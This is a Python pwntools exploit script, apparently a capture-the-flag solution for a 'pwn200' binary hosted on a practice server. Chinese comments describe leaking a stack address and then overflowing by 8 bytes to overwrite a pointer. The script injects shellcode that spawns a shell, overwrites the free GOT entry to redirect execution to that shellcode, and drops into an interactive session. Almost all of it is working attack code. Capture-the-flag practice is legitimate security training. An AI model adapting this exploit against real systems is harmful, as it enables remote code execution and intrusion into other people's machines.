# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
#context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './pwn200'
elf = ELF(binary)
libc = elf.libc
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '26535'
    p = remote(host,port)
l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda a          : int( p.recv(len(str(a)))[2:] , 16)
def dbg():
    gdb.attach(p)
    pause()

def bgdb(fun):
    gdb.attach(p,'b %s'%fun)

def cmd(num):
    sla('>',num)

#第一次输入没问题，但是可以把rbp带出来得到栈地址
#第二次输入直接溢出0x8个字节可以将一个指针覆盖，而那个指针后面会使用

free_got = elf.got["free"]

payload = asm(shellcraft.sh())

#bgdb("printf")
sla("u?",payload)
stack_addr = l64()
#lg("stack_addr",stack_addr)

shell_addr = stack_addr - 0x50


payload = p64(shell_addr).ljust(0x38 ,"\x00") + p64(free_got)
#sla("your id ~~?",payload)

sla("give me money~",payload)

#dbg()

p.interactive()

'''
@File    :   pwn200.py
@Time    :   2021/07/23 23:38:29
@Author  :   Niyah 
'''